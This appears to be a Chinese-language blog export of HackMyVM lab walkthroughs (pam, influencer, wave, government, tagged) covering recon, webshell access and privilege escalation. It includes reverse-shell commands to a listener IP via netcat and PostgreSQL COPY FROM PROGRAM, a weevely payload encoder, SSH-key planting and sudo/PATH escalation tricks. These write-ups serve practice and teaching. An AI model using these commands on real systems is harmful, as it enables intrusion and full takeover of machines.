<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> sudo /root/lago; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113812.png" ></p>
<h5 id="解决思路2"><a href="#解决思路2" class="headerlink" title="解决思路2"></a>解决思路2</h5><p>在&#x2F;home&#x2F;sam的目录下有个.pyc文件，下载下来反编译一下，就能看到lago的源码，注意到</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318114957.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2012.08.59.png" ></p>
<p>选项2那里有个判断，要判断s是否等于num，那直接输入num，input把你传递的num当成了一个变量（注意靶机的pyhton版本是2.x，如果是3以上的版本这个思路不行），num&#x3D;num自然就可以了，神奇。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318115124.png" ></p>
<p>也可以利用input的动态载入，也能拿到root</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;/bin/bash&#x27;)</span><br></pre></td></tr></table></figure>

<p>输入这个python2的input支持动态载入，把这个语句当成表达式执行，如果是pyhton3就只会当成字符串</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113923.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机涉及到的知识点比较多：ftp下载文件，远程计算器脚本的编写，ssh敲门打开端口，反弹shell的绕过方法，pkexec的提权，man查看使用手册（比–help详细），pyc反编译，python2中input的智能转换和动态载入的利用，都很值得学习。</p>
<p>在整个过程中，信息搜集一如既往的重要。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm pam复盘</title>
    <url>/2024/03/22/hackmyvm-pam%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址： <a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Pam" >https://hackmyvm.eu/machines/machine.php?vm=Pam<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：medium</p>
<p>ip：192.168.64.90</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>扫到80和21端口，到80端口，是“phpipam is ready.”，phpipam是一个Web IP地址管理应用程序，直接访问&#x2F;phpipam后自动跳转到一个登陆页面</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322105140.png" ></p>
<p>尝试了注入，弱口令啥的，找不到什么可以利用的，扫目录能扫到很多子目录，还没有什么利用思路</p>
<p>转过头来看21端口，lftp用anonymous为账号密码登陆成功，到&#x2F;home目录下还能知道有一个italia账户</p>
<p>到&#x2F;var&#x2F;www&#x2F;html&#x2F;phpipam目录下有很多子目录，没什么头绪</p>
<p>这个时候看wp，让我眼前一亮，思路是<strong>用一个搜索语句搜索可以编辑上传的子目录，然后上传一个后门php，再在网页端访问反弹一个shell</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find -l /var/www/html| grep &quot;d.w..w..w.&quot;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322105808.png" ></p>
<p>找到两个可以用的目录，我在其中一个上传一个后门</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322105947.png" ></p>
<p>然后在网页访问&#x2F;phpipam&#x2F;app&#x2F;subnets&#x2F;import-subnet&#x2F;upload&#x2F;php-reverse-shell.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322110136.png" ></p>
<p>成功拿到第一个shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>输入<strong>ss -lntp</strong>查看有哪些端口开放了，注意到有一个12345端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322110258.png" ></p>
<p>curl一下，拿到一大段字符串</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322110405.png" ></p>
<p>看起来像base64，拿到cyberchef解密一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322112416.png" ></p>
<p>看到PNG文件头，以图片的形式保存下来</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322112506.png" ></p>
<p>猜测中间那一串是密码，登陆italia账户</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322112614.png" ></p>
<p>拿到第二个shell</p>
<p>sudo -l查到feh可以利用，在Linux下，feh是一个基于命令行的图像查看器。它特别设计用于快速查看图像</p>
<p>看帮助文档，-A可以指定一个 shell 命令作为要在图像上执行的动作，配合-U不显示图片</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322114316.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322114405.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo feh -uA /bin/bash</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322114517.png" ></p>
<p>提权成功，这个靶机的root.enc是加密过的，</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322114632.png" ></p>
<p>openssl生成的密码，而且前面拿到的那张图片，右下角有一串“-aes-256-cbc”，应该就是加密类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl enc -aes-256-cbc -d -in root.enc -out root.txt -k rootisCLOSE</span><br></pre></td></tr></table></figure>

<p>-d解密，-k指定解密时使用的密钥，解密出来成功拿到flag</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>ftp上传后门，查看内部开放端口，feh的利用，openssl解密</p>
<p>最有收获的是在ftp那里搜索看编辑的目录，学习了。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm influencer复盘</title>
    <url>/2024/04/05/hackmyvm-influencer%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Influencer" >https://hackmyvm.eu/machines/machine.php?vm=Influencer<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：medium</p>
<p>ip：192.168.64.115(后变成116)</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>nmap扫到2121端口（是ftp服务（和80端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405154528.png" ></p>
<p>无密码连接ftp，有一个note.txt提示有个wordpress站点，还有很多张图片，用工具分析了图片，找到snapchat.jpg有隐藏信息</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405154710.png" ></p>
<p>给了一串密码，还要看用户名</p>
<p>看看80端口，到目录扫到&#x2F;wordpress，很容易就找到登录口，用wpscan扫描，扫到一个用户名luna，尝试用刚刚到密码登录，失败，rockyou.txt爆破也没有结果，然后就去站点本身看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155202.png" ></p>
<p>看到有关luna的个人信息，用社工工具生成一个字典</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-05%2015.54.55.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155651.png" ></p>
<p>然后用wpscan爆破出密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155805.png" ></p>
<p>成功爆破出来，登录后台</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155939.png" ></p>
<p>找到appearance-&gt;theme file editor，修改php文件，写入后门文件，本地开启监听</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160202.png" ></p>
<p>成功拿到www-data的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160255.png" ></p>
<h4 id="userflag"><a href="#userflag" class="headerlink" title="userflag"></a>userflag</h4><p>ss -lntp查看开放了什么端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160424.png" ></p>
<p>注意到有个1212端口，先用socat转发出去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:4444,fork TCP:localhost:1212 &amp; </span><br></pre></td></tr></table></figure>

<p>然后访问4444端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160617.png" ></p>
<p>看来是个ssh服务，那就用ssh连接，用最开始在图片里拿到的密码，成功登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh luna@192.168.64.116 -p 4444</span><br><span class="line">密码：u3jkeg97gf</span><br></pre></td></tr></table></figure>

<p>然后使用sudo -l查到juan可以免密码执行exiftool</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160840.png" ></p>
<p>再查询知道exiftool可以写文件，<strong>思路是在juan的.ssh目录下写一个authorized_keys</strong>,然后ssh连接登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">luna@influencer:~$ cd /tmp</span><br><span class="line">luna@influencer:/tmp$ echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8pW4mmY4tPKfm6n1XBJldNxoo+ehIpzS1Y1kI32qU8fLVbraU85pjcPUK7pHcvoKfBl02hjpKhsTSHHG5iEsaCAMrD8euYDfNRKu0ITfX5EukM8JhDXEgWzGWlieF9KEB0haZJyFm6lIVPK950FtElXNZGagQ3wyQoVGRnoUhTlyeK5BcFbFlnMZdndOEB8TPOTzc13SpfCSU7lF4YckPjqgV1Y45kDEvJViv9xMPEd0be80F+lJ1J2/qywFTySfVlOqsFOzp3m3fLyUb80yk8Qs0BSR5q1NXexHXfCPwBbDW6vX4iygbSm1TRei2kre0CvsqUEgGipCmJTdkPQyr+ZFTZl/0DlSX07ZSrat9NAbXc+MfG5j0QsgebkjR4aWQxAym/yEfe7WGyOZdf43rxzS61dToq9CBrTQUapmwg6efBTwlEeMVA+fSK5bqxDvD1quCLoMrSonc7v4OKkopaB3hUfdM/YwGexHk7DLtsE50O80wMajhYy8aR4N4aI8= root@kali&#x27; &gt; abc</span><br><span class="line">luna@influencer:/tmp$ chmod 777 abc</span><br><span class="line">luna@influencer:/tmp$ sudo -u juan /usr/bin/exiftool -filename=/home/juan/.ssh/authorized_keys abc</span><br></pre></td></tr></table></figure>

<p>成功在本地登录</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161301.png"   style="zoom:50%;" >

<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l查到是免密码执行一个脚本，脚本内容是给server.hmv发送请求</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161444.png" ></p>
<p>然后查到&#x2F;etc&#x2F;hosts有写的权限，那么思路是修改&#x2F;etc&#x2F;hosts，<strong>把server.hmv的地址配置为自己kali的ip，开启apache服务并且在目录下新建一个98127651的文件</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161658.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161859.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161931.png" ></p>
<p>执行命令后再查看&#x2F;bin&#x2F;bash的权限</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405162027.png" ></p>
<p>最后bash -p重新进入bash，提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405162119.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶场虽然是medium，但是思路都是比较常见的，感觉做完是在回顾前段时间学到的东西。涉及的知识点：wpscan扫描，爆破密码，社工工具生成字典，wordpress后台写入后门，socat端口转发，exiftool读写文件，&#x2F;etc&#x2F;hosts配置。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm wave复盘</title>
    <url>/2024/03/22/hackmyvm-wave%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>这个靶机我是边看视频学习边做的的，写复盘目的是理清思路，吸收知识。在这里感谢群主做的视频，链接：<a class="link"   href="https://www.bilibili.com/video/BV1Uu4m1A7BU" >https://www.bilibili.com/video/BV1Uu4m1A7BU<i class="fas fa-external-link-alt"></i></a> </p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Wave" >https://hackmyvm.eu/machines/machine.php?vm=Wave<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：medium</p>
<p>ip：192.168.64.81</p>
<p>（后面由于靶机重置，ip改为192.168.64.100）</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>端口扫描扫到22和80端口，先到80端口，没什么东西，然后扫目录，还挺有东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322155511.png" ></p>
<p>robots.txt指示要访问&#x2F;backup</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322155642.png" ></p>
<p>就是有一些目录文件，然后注意到index,log,phptest.robots,他们有备份文件证明有源文件，比如index对应index.php,phptest对应phptest.php，那么也有一个叫weevely的文件，文件后缀未知。先下载看看。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322160208.png" ></p>
<p>一个 PHP Phar（PHP 归档）文件，思路是改名为weevely.phar，然后用脚本还原成php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$phar = new Phar(&quot;weevely.phar&quot;); $phar-&gt;extractTo(&quot;./weevely&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>解压到子目录weevely下面，解压出来的php，用ai解释一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 定义变量：密钥 $k、密钥头部 $kh、密钥尾部 $kf、参数 $p</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;3ddf0d5c&quot;</span>;</span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;b6e7a529b6c2&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;d598a771749b&quot;</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;afnqDsRcBpVmU71y&quot;</span>;</span><br><span class="line"><span class="comment">// 定义函数：执行异或加密操作</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>); <span class="comment">// 计算密钥的长度</span></span><br><span class="line">    <span class="variable">$l</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>); <span class="comment">// 计算文本的长度</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>; <span class="comment">// 初始化结果字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环遍历文本，执行异或加密操作</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>[<span class="variable">$i</span>] ^ <span class="variable">$k</span>[<span class="variable">$j</span>]; <span class="comment">// 对文本中的每个字符与密钥进行异或操作，并将结果追加到$o中</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>; <span class="comment">// 返回加密后的结果</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 从输入中解析数据并尝试执行解密的PHP代码</span></span><br><span class="line"><span class="keyword">if</span> (@<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>, @<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>), <span class="variable">$m</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">ob_start</span>(); <span class="comment">// 启动输出缓冲区</span></span><br><span class="line">    @<span class="keyword">eval</span>(@<span class="title function_ invoke__">gzuncompress</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$m</span>[<span class="number">1</span>]), <span class="variable">$k</span>))); <span class="comment">// 解密并执行从输入中提取的PHP代码</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$o</span> = @<span class="title function_ invoke__">ob_get_contents</span>(); <span class="comment">// 获取输出缓冲区的内容</span></span><br><span class="line">    @<span class="title function_ invoke__">ob_end_clean</span>(); <span class="comment">// 清空输出缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$r</span> = @<span class="title function_ invoke__">base64_encode</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$o</span>), <span class="variable">$k</span>)); <span class="comment">// 对执行结果进行压缩、加密</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$p</span><span class="subst">$kh</span><span class="subst">$r</span><span class="subst">$kf</span>&quot;</span>); <span class="comment">// 输出加密后的结果</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码逻辑是：php:&#x2F;&#x2F;input也就是接受POST的数据，和$kh,$kf拼接后，先base64解密，经过x函数异或，再用gzuncompress提取出php代码交给eval执行，执行后会把执行结果交给前面一套过程逆向执行。</p>
<p>也就是说，如果我要利用eval执行命令，正常传进去后会被执行一系列逻辑变成乱的，这样自然会执行失败，<strong>思路是写一个脚本，把原先的思路逆过来，传输进去后经过处理会变成正常语句</strong>，脚本如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);<span class="variable">$l</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);<span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$o</span>.=<span class="variable">$t</span>[<span class="variable">$i</span>]^<span class="variable">$k</span>[<span class="variable">$j</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数照搬</span></span><br><span class="line"><span class="variable">$k</span>=<span class="string">&quot;3ddf0d5c&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span>=@<span class="title function_ invoke__">base64_encode</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">gzcompress</span>(<span class="string">&quot;echo shell_exec(&#x27;nc -e /bin/bash 192.168.64.3 8888&#x27;);&quot;</span>),<span class="variable">$k</span>));</span><br><span class="line"><span class="comment">// 这句也可以照搬，中间写入要执行的命令</span></span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$r</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>接下来就可以向weevely发送数据，现在问题是不知道他的后缀，fuzz一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -w extension.txt -u &#x27;192.168.64.81/weevely.FUZZ&#x27;</span><br></pre></td></tr></table></figure>

<p>extension.txt里面是一些常见的php后缀，最后测出来是php7</p>
<p>指定脚本，获得要发生的数据，接下来就访问weevely.php7发送POST</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X POST http://192.168.64.100/weevely.php7 -d <span class="string">&#x27;b6e7a529b6c2S/gvK/6sYkv9LKmvuSuYK36yNKl7MuUuZrQrrPy3eikfqjRWhFDnUAfXtFUDtQY1g2RmE30PNa1oa3Q=d598a771749b&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211020.png" ></p>
<p>成功反弹的第一个shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>经过一番搜寻，查看到靶机对内开放了3923端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211135.png" ></p>
<p>利用socat端口转发到8001端口，访问看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:8001,fork TCP:localhost:3923</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211236.png" ></p>
<p>是一个长的比较可爱的文件管理界面，当前目录是&#x2F;root，有文件上传功能也有创建目录功能，那么思路是 <strong>创建一个.ssh目录，在里面上传自己kali的公钥，命名为authorized_keys,然后用攻击机ssh登陆</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211509.png" ></p>
<p>上传后看一下有哪些用户名</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-23%2021.15.52.png" ></p>
<p>经过尝试，angie登陆成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211749.png" ></p>
<p>Sudo -l 查到less可以利用，只能用来阅读&#x2F;opt&#x2F;secret.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211813.png" ></p>
<p>看题解学习到提权思路是：</p>
<p>首先less的功能是读取文件，当它读取的文件有很多行一个终端显示不下的时候，最下面可以有一个命令行，我们可以利用这一点输入命令拿到一个&#x2F;bin&#x2F;sh。然后靶机的secret.txt只有两行，这个时候我们只能去kali本机的终端操作，把终端尺寸缩到很小，自然会出现命令行。</p>
<p>输入“sudo &#x2F;usr&#x2F;bin&#x2F;less -F &#x2F;opt&#x2F;secret.txt”，然后缩小终端</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323212531.png" ></p>
<p>缩到这么小，再输入”!&#x2F;bin&#x2F;sh”，成功拿到shell，提权成功。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323212632.png" ></p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm government复盘</title>
    <url>/2024/06/20/hackmyvm-government%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>nmap扫端口扫到21、22、80，先看21端口</p>
<p>lftp连接可以看到有几个文件夹，里面都是一些txt</p>
<p>有看到以下信息（对后续有点用）</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620194452.png"   style="zoom:50%;" >

<p>还有这两个个文件，是一些md5加密后的数据（都能解开），还有几个用户名，保存下来hydra爆破ssh失败</p>
<p>还有一些其他的txt，不知道能干嘛</p>
<p>转向80端口，扫目录有不少东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195058.png" ></p>
<p>最开始看了一下&#x2F;blog下面的，看不出什么cms，也没什么功能的，目录倒是很开放（没什么用</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>后来看了phppgadmin，是个数据库管理界面</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195222.png" ></p>
<p>有个登录口，尝试使用 postgres:admin 弱口令登录（这个用户名有点没想到），登录成功，查找相关的漏洞</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195343.png" ></p>
<p>直接可以反弹shell了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE IF EXISTS cmd_exec;</span><br><span class="line">CREATE TABLE cmd_exec(cmd_output text);</span><br><span class="line">COPY cmd_exec FROM PROGRAM &#x27;nc -e /bin/bash 192.168.64.3 1234&#x27;;</span><br><span class="line">SELECT * FROM cmd_exec;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195510.png" ></p>
<p>注意那个Paginate results不用勾选，然后成功反弹到shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195628.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>寻找了很久，发现在&#x2F;var&#x2F;log下有个.creds.log</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195807.png" ></p>
<p>结合前面ftp看到的信息，可以知道是Blowfish加密，key和IV都给出来了，用工具解密即可</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195936.png" ></p>
<p>拿到一串密钥，登录erik用户，能够拿到user.txt</p>
<p>查找suid提权</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620200131.png" ></p>
<p>发现&#x2F;home&#x2F;erik&#x2F;backups&#x2F;nuclear下有个remove，用strings看一下大概是干嘛的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-06-20%2020.06.32.png" ></p>
<p>可以知道执行了time命令，接下来的思路就是环境变量劫持了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;/bin/bash -p&#x27;&gt;/tmp/time</span><br><span class="line">chmod +x /tmp/time</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./remove a</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620200824.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>前面ftp和80端口的&#x2F;blog太迷惑人，还有就是找到.creds.log要细心，其他地方都还好。</p>
]]></content>
      <tags>
        <tag>复盘</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm 思路复盘2</title>
    <url>/2024/03/21/hackmyvm%E5%A4%8D%E7%9B%98%E5%90%88%E9%9B%862/</url>
    <content><![CDATA[<h3 id="tagged"><a href="#tagged" class="headerlink" title="tagged"></a>tagged</h3><p>靶机ip：192.168.64.98</p>
<p>扫到有80端口和7746端口，然后到了80端口一访问就提示tagged.hmv，第一时间配置hosts文件，然后看到源码有一句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tagged.hmv</span><br><span class="line"></span><br><span class="line">&lt;!-- http://xxx.tagged.hmv :D --&gt;</span><br></pre></td></tr></table></figure>

<p>自然就想到了扫子域名，结果扫不到，然后扫了目录，扫到了index.php，report.php，report.html但是没有内容</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235025.png" ></p>
<p>访问index.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235123.png" ></p>
